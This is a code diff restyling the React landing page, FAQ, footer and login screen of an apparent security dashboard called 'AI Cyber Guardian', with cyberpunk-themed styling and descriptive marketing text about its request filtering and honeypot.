+          <h2 style={{ fontSize: "clamp(26px, 3.5vw, 34px)", fontWeight: 900, color: "#ffffff", fontFamily: "'Inter', sans-serif", margin: "10px 0" }}>
+            From Ingress Attack to In-Memory Honeypot
+          </h2>
+        </div>
+
+        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(290px, 1fr))", gap: 24 }}>
+          {[
+            {
+              step: "01",
+              title: "80-D Ingress Extraction",
+              text: "HTTP parameters, headers, and body are canonicalized. Shannon entropy & 64 character n-gram frequencies extracted in 0.85ms.",
+              tag: "INLINE FILTER",
+              color: "#38bdf8"
+            },
+            {
+              step: "02",
+              title: "Adaptive Confidence Fusion",
+              text: "Isolation Forest outlier score and Random Forest class probabilities are dynamically blended against deterministic signatures.",
+              tag: "DECISION MATRIX",
+              color: "#a855f7"
+            },
+            {
+              step: "03",
+              title: "In-Memory Linux Sandbox",
+              text: "Instead of a 403 error, malicious sessions quietly divert to a fake virtual filesystem. Attackers fuzz decoy keys while telemetry is logged.",
+              tag: "ZERO ESCAPE VFS",
+              color: "#ef4444"
+            }
+          ].map((s) => (
+            <div
+              key={s.step}
+              style={{
+                background: "rgba(255, 255, 255, 0.04)",
+                border: "1px solid rgba(255, 255, 255, 0.12)",
+                borderRadius: 22,
+                padding: "28px 24px",
+                position: "relative",
+              }}
+            >
+              <div
+                style={{
+                  fontSize: 32,
+                  fontWeight: 900,
+                  fontFamily: "'Inter', sans-serif",
+                  color: s.color,
+                  marginBottom: 12,
+                  
+                }}
+              >
+                {s.step}
+              </div>
+              <div style={{ fontSize: 16, fontWeight: 800, color: "#ffffff", marginBottom: 10, fontFamily: "'Inter', sans-serif" }}>
+                {s.title}
+              </div>
+              <p style={{ color: "rgba(255, 255, 255, 0.7)", fontSize: 13, lineHeight: 1.65, margin: 0 }}>
+                {s.text}
+              </p>
+            </div>
+          ))}
+        </div>
+      </div>
+
+      {/* ── Interactive FAQ Section ── */}
+      <div
+        id="faq"
+        style={{
+          position: "relative",
+          zIndex: 2,
+          maxWidth: 960,
+          margin: "90px auto",
+          padding: "0 24px",
+        }}
+      >
+        <div style={{ textAlign: "center", marginBottom: 44 }}>
+          <span style={{ color: "#38bdf8", fontFamily: "'Inter', sans-serif", fontSize: 11, fontWeight: 800, letterSpacing: "2px" }}>
+            FREQUENTLY ASKED QUESTIONS
+          </span>
+          <h2 style={{ fontSize: "clamp(26px, 3.5vw, 36px)", fontWeight: 900, color: "#ffffff", fontFamily: "'Inter', sans-serif", margin: "10px 0" }}>
+            Engine Architecture & Deployment
+          </h2>
+        </div>
+
+        <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
+          {faqs.map((faq, idx) => {
+            const isOpen = openFaq === idx;
+            return (
+              <div
+                key={faq.q}
+                style={{
+                  borderRadius: 18,
+                  background: isOpen ? "rgba(12, 18, 38, 0.85)" : "rgba(10, 15, 28, 0.55)",
+                  border: isOpen ? "1px solid #38bdf8" : "1px solid rgba(255, 255, 255, 0.12)",
+                  boxShadow: isOpen ? "0 0 25px rgba(0, 240, 255, 0.2)" : "none",
+                  overflow: "hidden",
+                  transition: "all 0.25s ease",
+                }}
+              >
+                <div
+                  onClick={() => {
+                    playClickSound();
+                    setOpenFaq(isOpen ? null : idx);
+                  }}
+                  style={{
+                    padding: "20px 24px",
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "center",
+                    cursor: "pointer",
+                  }}
+                >
+                  <span
+                    style={{
+                      fontFamily: "'Inter', sans-serif",
+                      fontWeight: 800,
+                      fontSize: 15,
+                      color: isOpen ? "#38bdf8" : "#ffffff",
+                    }}
+                  >
+                    {faq.q}
+                  </span>
+                  <span style={{ fontSize: 18, color: isOpen ? "#38bdf8" : "rgba(255, 255, 255, 0.5)", fontWeight: 900 }}>
+                    {isOpen ? "−" : "+"}
+                  </span>
+                </div>
+                {isOpen && (
+                  <div
+                    style={{
+                      padding: "0 24px 22px",
+                      color: "rgba(255, 255, 255, 0.78)",
+                      fontSize: 13,
+                      lineHeight: 1.7,
+                      borderTop: "1px solid rgba(255, 255, 255, 0.08)",
+                      paddingTop: 16,
+                    }}
+                  >
+                    {faq.a}
+                  </div>
+                )}
+              </div>
+            );
+          })}
+        </div>
+      </div>
+
+      {/* ── Cyberpunk Footer ── */}
+      <footer
+        style={{
+          position: "relative",
+          zIndex: 2,
+          borderTop: "1px solid rgba(0, 240, 255, 0.25)",
+          padding: "36px 40px",
+          background: "rgba(5, 8, 18, 0.94)",
+          backdropFilter: "blur(24px)",
+          display: "flex",
+          justifyContent: "space-between",
+          alignItems: "center",
+          flexWrap: "wrap",
+          gap: 20,
+        }}
+      >
+        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
+          <span style={{ fontSize: 20 }}>🛡️</span>
+          <div>
+            <span
+              style={{
+                fontFamily: "'Inter', sans-serif",
+                fontWeight: 900,
+                fontSize: 14,
+                color: "#38bdf8",
+                letterSpacing: "1.2px",
+              }}
+            >
+              AI CYBER GUARDIAN © 2026–2027
+            </span>
+            <div style={{ fontSize: 10, color: "rgba(255, 255, 255, 0.5)", fontFamily: "'Fira Code', monospace" }}>
+              RESEARCH PROTOTYPE & SOC PRODUCTION PLATFORM
+            </div>
+          </div>
+        </div>
+        <div style={{ display: "flex", gap: 24, fontSize: 12, color: "rgba(255, 255, 255, 0.7)", fontFamily: "'Fira Code', monospace" }}>
+          <span style={{ cursor: "pointer", transition: "color 0.2s" }} onClick={() => { playClickSound(); onNav("login"); }}>
+            PORTAL LOGIN
+          </span>
+          <span style={{ cursor: "pointer", transition: "color 0.2s" }} onClick={() => { playClickSound(); onNav("dashboard"); }}>
+            SOC TELEMETRY
+          </span>
+          <span style={{ cursor: "pointer", transition: "color 0.2s" }} onClick={() => { playClickSound(); onNav("admin"); }}>
+            SUPER ADMIN
+          </span>
+          <span style={{ color: "#22c55e", fontWeight: 700 }}>STIX 2.1 COMPLIANT</span>
+        </div>
+      </footer>
     </div>
   );
 }
+
 
 // ── Screen: Login ──────────────────────────────────────────────────────────
 function Login({ onNav }) {
@@ -863,18 +2384,7 @@ function Login({ onNav }) {
   const [email, setEmail] = useState("client@example.com");
   const [pass, setPass] = useState("••••••••••");
   const [loading, setLoading] = useState(false);
-
-  const inputStyle = {
-    width: "100%",
-    background: T.surface2,
-    border: `1px solid ${T.border}`,
-    color: T.text,
-    borderRadius: 5,
-    padding: "9px 12px",
-    fontSize: 13,
-    fontFamily: "inherit",
-    outline: "none",
-  };
+  const [focusedField, setFocusedField] = useState(null);
 
   function selectRole(r) {
     setRole(r);
@@ -903,128 +2413,583 @@ function Login({ onNav }) {
         minHeight: "100vh",
         display: "flex",
         flexDirection: "column",
-        background: `radial-gradient(ellipse at 50% 0%, ${T.surface} 0%, ${T.bg} 70%)`,
+        position: "relative",
+        backgroundImage: `radial-gradient(ellipse at 50% 25%, rgba(0, 240, 255, 0.08) 0%, rgba(9, 13, 26, 0.78) 55%, rgba(5, 7, 15, 0.94) 100%), url(${cyberpunkBg})`,
+        backgroundSize: "cover",
+        backgroundPosition: "center",
+        backgroundAttachment: "fixed",
+        overflowX: "hidden",
       }}
     >
+      {/* Cyberpunk Scanline & Ambient Grid Overlay */}
+      <div
+        style={{
+          position: "absolute",
+          inset: 0,
+          pointerEvents: "none",
+          backgroundImage:
+            "linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px)",
+          backgroundSize: "40px 40px",
+          zIndex: 1,
+        }}
+      />
+
+      {/* Cyberpunk Top Bar */}
       <nav
         style={{
-          padding: "16px 40px",
+          position: "relative",
+          zIndex: 2,
+          padding: "18px 40px",
           display: "flex",
           alignItems: "center",
           justifyContent: "space-between",
-          borderBottom: `1px solid ${T.border}`,
+          backdropFilter: "blur(12px)",
+          borderBottom: "1px solid rgba(0, 240, 255, 0.18)",
+          background: "rgba(5, 9, 20, 0.45)",
         }}
       >
-        <div style={{ display: "flex", alignItems: "center", gap: 8, cursor: "pointer" }} onClick={() => onNav("landing")}>
-          <span>🛡️</span>
-          <span style={{ fontFamily: "monospace", fontWeight: 700, color: T.blue }}>AI Cyber Guardian</span>
+        <div
+          style={{ display: "flex", alignItems: "center", gap: 10, cursor: "pointer" }}
+          onClick={() => onNav("landing")}
+        >
+          <div
+            style={{
+              width: 32,
+              height: 32,
+              borderRadius: "50%",
+              background: "rgba(0, 240, 255, 0.15)",
+              border: "1px solid #00f0ff",
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center",
+              boxShadow: "0 0 15px rgba(0, 240, 255, 0.4)",
+            }}
+          >
+            <span style={{ fontSize: 16 }}>🛡️</span>
+          </div>
+          <span
+            style={{
+              fontFamily: "'Orbitron', 'Rajdhani', monospace, sans-serif",
+              fontWeight: 800,
+              fontSize: 16,
+              letterSpacing: "1.5px",
+              color: "#00f0ff",
+              textShadow: "0 0 10px rgba(0, 240, 255, 0.6)",
+            }}
+          >
+            AI CYBER GUARDIAN
+          </span>
         </div>
-        <span style={{ color: T.muted, fontSize: 12, cursor: "pointer" }} onClick={() => onNav("landing")}>
-          ← Back to home
-        </span>
+        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
+          <span
+            style={{
+              display: "inline-flex",
+              alignItems: "center",
+              gap: 6,
+              fontSize: 11,
+              fontFamily: "monospace",
+              color: "#39ff14",
+              background: "rgba(57, 255, 20, 0.1)",
+              padding: "4px 10px",
+              borderRadius: 20,
+              border: "1px solid rgba(57, 255, 20, 0.3)",
+            }}
+          >
+            <span
+              style={{
+                width: 6,
+                height: 6,
+                borderRadius: "50%",
+                background: "#39ff14",
+                boxShadow: "0 0 8px #39ff14",
+              }}
+            />
+            QUANTUM-DECEPTION ONLINE
+          </span>
+          <span
+            style={{
+              color: "rgba(255, 255, 255, 0.7)",
+              fontSize: 12,
+              cursor: "pointer",
+              fontFamily: "monospace",
+              transition: "all 0.2s",
+            }}
+            onClick={() => onNav("landing")}
+            onMouseEnter={(e) => (e.currentTarget.style.color = "#00f0ff")}
+            onMouseLeave={(e) => (e.currentTarget.style.color = "rgba(255, 255, 255, 0.7)")}
+          >
+            ← BACK TO HOME
+          </span>
+        </div>
       </nav>
-      <div style={{ flex: 1, display: "flex", alignItems: "center", justifyCenter: "center", justifyContent: "center", padding: 24 }}>
-        <Card style={{ width: "100%", maxWidth: 400, padding: "32px 30px" }}>
-          <div style={{ textAlign: "center", marginBottom: 24 }}>
-            <span style={{ fontSize: 32 }}>{role === "admin" ? "👑" : "🛡️"}</span>
-            <h2 style={{ fontSize: 20, fontWeight: 700, color: T.text, margin: "10px 0 4px" }}>
-              {role === "admin" ? "Super Admin Portal" : "Welcome back"}
-            </h2>
-            <p style={{ color: T.muted, fontSize: 13 }}>
-              {role === "admin" ? "Sign in to platform control plane" : "Sign in to your customer SOC"}
+
+      {/* Main Glassmorphic Transparent Container */}
+      <div
+        style={{
+          position: "relative",
+          zIndex: 2,
+          flex: 1,
+          display: "flex",
+          alignItems: "center",
+          justifyContent: "center",
+          padding: "36px 20px",
+        }}
+      >
+        <div
+          style={{
+            width: "100%",
+            maxWidth: 420,
+            padding: "40px 36px 36px",
+            borderRadius: 28,
+            backdropFilter: "blur(24px) saturate(180%)",
+            WebkitBackdropFilter: "blur(24px) saturate(180%)",
+            background: "rgba(12, 18, 32, 0.52)",
+            border: "1px solid rgba(0, 240, 255, 0.38)",
+            boxShadow:
+              "0 24px 60px rgba(0, 0, 0, 0.75), 0 0 35px rgba(0, 240, 255, 0.22), inset 0 0 20px rgba(255, 0, 128, 0.14)",
+            position: "relative",
+            transition: "all 0.3s ease",
+          }}
+        >
+          {/* Subtle Glowing Cyan Top Accent */}
+          <div
+            style={{
+              position: "absolute",
+              top: 0,
+              left: "20%",
+              right: "20%",
+              height: 2,
+              background: "linear-gradient(90deg, transparent, #00f0ff, #ff007f, transparent)",
+              boxShadow: "0 0 12px #00f0ff",
+            }}
+          />
+
+          {/* Header Title: LOGIN */}
+          <div style={{ textAlign: "center", marginBottom: 28 }}>
+            <h1
+              style={{
+                margin: 0,
+                fontSize: 34,
+                fontWeight: 900,
+                letterSpacing: "4px",
+                fontFamily: "'Orbitron', 'Rajdhani', monospace, sans-serif",
+                color: "#ffffff",
+                textShadow:
+                  "0 0 10px rgba(0, 240, 255, 0.9), 0 0 22px rgba(0, 240, 255, 0.6), 0 0 36px rgba(255, 0, 128, 0.35)",
+              }}
+            >
+              LOGIN
+            </h1>
+            <p
+              style={{
+                color: "rgba(0, 240, 255, 0.7)",
+                fontSize: 12,
+                marginTop: 6,
+                fontFamily: "monospace",
+                letterSpacing: "1px",
+              }}
+            >
+              SECURE DECEPTION & THREAT FUSION PORTAL
             </p>
           </div>
 
-          {/* Quick Role Preset Switcher */}
+          {/* Role Switcher Pill */}
           <div
             style={{
               display: "grid",
               gridTemplateColumns: "1fr 1fr",
-              gap: 8,
-              marginBottom: 20,
-              background: T.surface2,
+              gap: 6,
+              marginBottom: 24,
+              background: "rgba(0, 0, 0, 0.35)",
               padding: 4,
-              borderRadius: 6,
+              borderRadius: 24,
+              border: "1px solid rgba(0, 240, 255, 0.22)",
             }}
           >
             <button
               type="button"
               onClick={() => selectRole("client")}
               style={{
-                background: role === "client" ? T.blue : "transparent",
-                color: role === "client" ? "#0D1117" : T.muted,
-                border: "none",
-                borderRadius: 4,
-                padding: "7px 10px",
-                fontSize: 12,
-                fontWeight: 700,
+                background:
+                  role === "client"
+                    ? "linear-gradient(135deg, rgba(0, 240, 255, 0.4), rgba(0, 150, 255, 0.4))"
+                    : "transparent",
+                color: role === "client" ? "#00f0ff" : "rgba(255, 255, 255, 0.55)",
+                border: role === "client" ? "1px solid #00f0ff" : "1px solid transparent",
+                borderRadius: 20,
+                padding: "8px 12px",
+                fontSize: 11,
+                fontWeight: 800,
+                letterSpacing: "1px",
                 cursor: "pointer",
-                transition: "all 0.15s",
+                transition: "all 0.2s",
+                boxShadow: role === "client" ? "0 0 12px rgba(0, 240, 255, 0.3)" : "none",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6,
               }}
             >
-              👤 Client SOC
+              <span>🛡️</span> CLIENT SOC
             </button>
             <button
               type="button"
               onClick={() => selectRole("admin")}
               style={{
-                background: role === "admin" ? T.purple : "transparent",
-                color: role === "admin" ? "#ffffff" : T.muted,
-                border: "none",
-                borderRadius: 4,
-                padding: "7px 10px",
-                fontSize: 12,
-                fontWeight: 700,
+                background:
+                  role === "admin"
+                    ? "linear-gradient(135deg, rgba(255, 0, 128, 0.45), rgba(168, 85, 247, 0.45))"
+                    : "transparent",
+                color: role === "admin" ? "#ff007f" : "rgba(255, 255, 255, 0.55)",
+                border: role === "admin" ? "1px solid #ff007f" : "1px solid transparent",
+                borderRadius: 20,
+                padding: "8px 12px",
+                fontSize: 11,
+                fontWeight: 800,
+                letterSpacing: "1px",
                 cursor: "pointer",
-                transition: "all 0.15s",
+                transition: "all 0.2s",
+                boxShadow: role === "admin" ? "0 0 12px rgba(255, 0, 128, 0.4)" : "none",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6,
               }}
             >
-              👑 Super Admin
+              <span>👑</span> SUPER ADMIN
             </button>
           </div>
 
+          {/* Form Fields: Email or username */}
           <div style={{ marginBottom: 16 }}>
-            <label style={{ color: T.muted, fontSize: 12, display: "block", marginBottom: 5 }}>Email</label>
-            <input value={email} onChange={(e) => setEmail(e.target.value)} placeholder="your@email.com" style={inputStyle} />
+            <div
+              style={{
+                position: "relative",
+                display: "flex",
+                alignItems: "center",
+                background: "rgba(255, 255, 255, 0.07)",
+                border:
+                  focusedField === "email"
+                    ? "1px solid #00f0ff"
+                    : "1px solid rgba(0, 240, 255, 0.32)",
+                borderRadius: 24,
+                backdropFilter: "blur(12px)",
+                boxShadow:
+                  focusedField === "email"
+                    ? "0 0 15px rgba(0, 240, 255, 0.35), inset 0 2px 4px rgba(0,0,0,0.5)"
+                    : "inset 0 2px 4px rgba(0,0,0,0.4)",
+                transition: "all 0.2s ease",
+              }}
+            >
+              <span
+                style={{
+                  position: "absolute",
+                  left: 16,
+                  color: focusedField === "email" ? "#00f0ff" : "rgba(0, 240, 255, 0.7)",
+                  fontSize: 14,
+                }}
+              >
+                👤
+              </span>
+              <input
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                onFocus={() => setFocusedField("email")}
+                onBlur={() => setFocusedField(null)}
+                placeholder="Email or username"
+                style={{
+                  width: "100%",
+                  background: "transparent",
+                  border: "none",
+                  color: "#ffffff",
+                  padding: "12px 18px 12px 42px",
+                  fontSize: 13,
+                  fontFamily: "inherit",
+                  outline: "none",
+                  letterSpacing: "0.5px",
+                }}
+              />
+            </div>
           </div>
-          <div style={{ marginBottom: 8 }}>
-            <label style={{ color: T.muted, fontSize: 12, display: "block", marginBottom: 5 }}>Password</label>
-            <input
-              value={pass}
-              onChange={(e) => setPass(e.target.value)}
-              type="password"
-              placeholder="••••••••••"
-              style={inputStyle}
-            />
+
+          {/* Form Fields: Password */}
+          <div style={{ marginBottom: 12 }}>
+            <div
+              style={{
+                position: "relative",
+                display: "flex",
+                alignItems: "center",
+                background: "rgba(255, 255, 255, 0.07)",
+                border:
+                  focusedField === "pass"
+                    ? "1px solid #00f0ff"
+                    : "1px solid rgba(0, 240, 255, 0.32)",
+                borderRadius: 24,
+                backdropFilter: "blur(12px)",
+                boxShadow:
+                  focusedField === "pass"
+                    ? "0 0 15px rgba(0, 240, 255, 0.35), inset 0 2px 4px rgba(0,0,0,0.5)"
+                    : "inset 0 2px 4px rgba(0,0,0,0.4)",
+                transition: "all 0.2s ease",
+              }}
+            >
+              <span
+                style={{
+                  position: "absolute",
+                  left: 16,
+                  color: focusedField === "pass" ? "#00f0ff" : "rgba(0, 240, 255, 0.7)",
+                  fontSize: 14,
+                }}
+              >
+                🔒
+              </span>
+              <input
+                value={pass}
+                onChange={(e) => setPass(e.target.value)}
+                onFocus={() => setFocusedField("pass")}
+                onBlur={() => setFocusedField(null)}
+                type="password"
+                placeholder="Password"
+                style={{
+                  width: "100%",
+                  background: "transparent",
+                  border: "none",
+                  color: "#ffffff",
+                  padding: "12px 18px 12px 42px",
+                  fontSize: 13,
+                  fontFamily: "inherit",
+                  outline: "none",
+                  letterSpacing: "1px",
+                }}
+              />
+            </div>
           </div>
+
+          {/* Forgot Password Link */}
           <div style={{ textAlign: "right", marginBottom: 20 }}>
-            <span style={{ color: T.blue, fontSize: 11, cursor: "pointer" }}>Forgot password?</span>
+            <span
+              style={{
+                color: "#00f0ff",
+                fontSize: 12,
+                cursor: "pointer",
+                fontFamily: "inherit",
+                textShadow: "0 0 8px rgba(0, 240, 255, 0.6)",
+                transition: "opacity 0.2s",
+              }}
+              onMouseEnter={(e) => (e.currentTarget.style.opacity = "0.75")}
+              onMouseLeave={(e) => (e.currentTarget.style.opacity = "1")}
+            >
+              Forgot password?
+            </span>
           </div>
+
+          {/* Primary Submit Button */}
           <button
             onClick={submit}
             style={{
               width: "100%",
-              padding: "10px",
-              background: loading ? T.surface2 : role === "admin" ? T.purple : T.blue,
-              color: loading ? T.muted : role === "admin" ? "#ffffff" : "#0D1117",
+              padding: "13px",
+              background: loading
+                ? "rgba(255, 255, 255, 0.1)"
+                : role === "admin"
+                ? "linear-gradient(90deg, #ff007f 0%, #a855f7 100%)"
+                : "linear-gradient(90deg, #00f0ff 0%, #0099ff 50%, #ff007f 100%)",
+              color: loading ? "rgba(255, 255, 255, 0.5)" : "#070b14",
               border: "none",
-              borderRadius: 5,
+              borderRadius: 24,
               fontSize: 13,
-              fontWeight: 700,
+              fontWeight: 900,
+              letterSpacing: "2px",
               cursor: loading ? "not-allowed" : "pointer",
-              fontFamily: "inherit",
-              transition: "all 0.2s",
-              boxShadow: role === "admin" ? `0 0 14px ${T.purple}66` : `0 0 14px ${T.blue}44`,
+              fontFamily: "'Orbitron', monospace, sans-serif",
+              transition: "all 0.25s ease",
+              boxShadow:
+                role === "admin"
+                  ? "0 0 24px rgba(255, 0, 128, 0.6), 0 0 45px rgba(255, 0, 128, 0.25)"
+                  : "0 0 24px rgba(0, 240, 255, 0.6), 0 0 45px rgba(0, 240, 255, 0.25)",
             }}
           >
-            {loading ? "Signing in..." : role === "admin" ? "Access Control Plane →" : "Sign In →"}
+            {loading ? "INITIALIZING SECURE SESSION..." : role === "admin" ? "ACCESS CONTROL PLANE →" : "AUTHENTICATE →"}
           </button>
-          <p style={{ textAlign: "center", color: T.muted, fontSize: 12, marginTop: 16 }}>
-            {role === "admin" ? "Authorized personnel only • 2FA enforced" : (
-              <>No account? <span style={{ color: T.blue, cursor: "pointer" }}>Register</span></>
+
+          {/* OR Divider with Neon Lines */}
+          <div
+            style={{
+              display: "flex",
+              alignItems: "center",
+              gap: 12,
+              margin: "24px 0 20px",
+            }}
+          >
+            <div
+              style={{
+                height: 1,
+                flex: 1,
+                background: "linear-gradient(to right, transparent, rgba(0, 240, 255, 0.7))",
+              }}
+            />
+            <span
+              style={{
+                color: "rgba(0, 240, 255, 0.85)",
+                fontSize: 12,
+                fontWeight: 800,
+                letterSpacing: "2px",
+                fontFamily: "monospace",
+              }}
+            >
+              OR
+            </span>
+            <div
+              style={{
+                height: 1,
+                flex: 1,
+                background: "linear-gradient(to left, transparent, rgba(0, 240, 255, 0.7))",
+              }}
+            />
+          </div>
+
+          {/* Social / Neural Auth Icons (Google, GitHub, X) */}
+          <div
+            style={{
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center",
+              gap: 16,
+              marginBottom: 20,
+            }}
+          >
+            {/* Google */}
+            <div
+              style={{
+                width: 44,
+                height: 44,
+                borderRadius: "50%",
+                background: "rgba(255, 255, 255, 0.08)",
+                border: "1px solid rgba(0, 240, 255, 0.35)",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                cursor: "pointer",
+                boxShadow: "0 0 14px rgba(0, 240, 255, 0.2)",
+                transition: "all 0.2s ease",
+              }}
+              onMouseEnter={(e) => {
+                e.currentTarget.style.transform = "scale(1.08)";
+                e.currentTarget.style.boxShadow = "0 0 20px rgba(0, 240, 255, 0.6)";
+              }}
+              onMouseLeave={(e) => {
+                e.currentTarget.style.transform = "scale(1)";
+                e.currentTarget.style.boxShadow = "0 0 14px rgba(0, 240, 255, 0.2)";
+              }}
+              title="Authenticate with Google"
+            >
+              <svg width="20" height="20" viewBox="0 0 24 24">
+                <path
+                  fill="#4285F4"
+                  d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
+                />
+                <path
+                  fill="#34A853"
+                  d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
+                />
+                <path
+                  fill="#FBBC05"
+                  d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
+                />
+                <path
+                  fill="#EA4335"
+                  d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
+                />
+              </svg>
+            </div>
+
+            {/* GitHub */}
+            <div
+              style={{
+                width: 44,
+                height: 44,
+                borderRadius: "50%",
+                background: "rgba(255, 255, 255, 0.08)",
+                border: "1px solid rgba(0, 240, 255, 0.35)",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                cursor: "pointer",
+                boxShadow: "0 0 14px rgba(0, 240, 255, 0.2)",
+                transition: "all 0.2s ease",
+              }}
+              onMouseEnter={(e) => {
+                e.currentTarget.style.transform = "scale(1.08)";
+                e.currentTarget.style.boxShadow = "0 0 20px rgba(0, 240, 255, 0.6)";
+              }}
+              onMouseLeave={(e) => {
+                e.currentTarget.style.transform = "scale(1)";
+                e.currentTarget.style.boxShadow = "0 0 14px rgba(0, 240, 255, 0.2)";
+              }}
+              title="Authenticate with GitHub"
+            >
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff">
+                <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z" />
+              </svg>
+            </div>
+
+            {/* X / Twitter */}
+            <div
+              style={{
+                width: 44,
+                height: 44,
+                borderRadius: "50%",
+                background: "rgba(255, 255, 255, 0.08)",
+                border: "1px solid rgba(0, 240, 255, 0.35)",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                cursor: "pointer",
+                boxShadow: "0 0 14px rgba(0, 240, 255, 0.2)",
+                transition: "all 0.2s ease",
+              }}
+              onMouseEnter={(e) => {
+                e.currentTarget.style.transform = "scale(1.08)";
+                e.currentTarget.style.boxShadow = "0 0 20px rgba(0, 240, 255, 0.6)";
+              }}
+              onMouseLeave={(e) => {
+                e.currentTarget.style.transform = "scale(1)";
+                e.currentTarget.style.boxShadow = "0 0 14px rgba(0, 240, 255, 0.2)";
+              }}
+              title="Authenticate with X"
+            >
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="#00f0ff">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+              </svg>
+            </div>
+          </div>
+
+          {/* Footer note */}
+          <p
+            style={{
+              textAlign: "center",
+              color: "rgba(255, 255, 255, 0.45)",
+              fontSize: 11,
+              marginTop: 18,
+              fontFamily: "monospace",
+              letterSpacing: "0.5px",
+            }}
+          >
+            {role === "admin" ? (
+              <span style={{ color: "#ff007f" }}>⚡ ROOT PERIMETER GUARD • ZERO ESCAPE HONEYPOT ACTIVE</span>
+            ) : (
+              <>
+                New enterprise tenant?{" "}
+                <span
+                  style={{ color: "#00f0ff", cursor: "pointer", textDecoration: "underline" }}
+                  onClick={() => selectRole("admin")}
+                >
+                  Request Provisioning
+                </span>
+              </>
             )}
           </p>
-        </Card>
+        </div>
       </div>
     </div>
   );
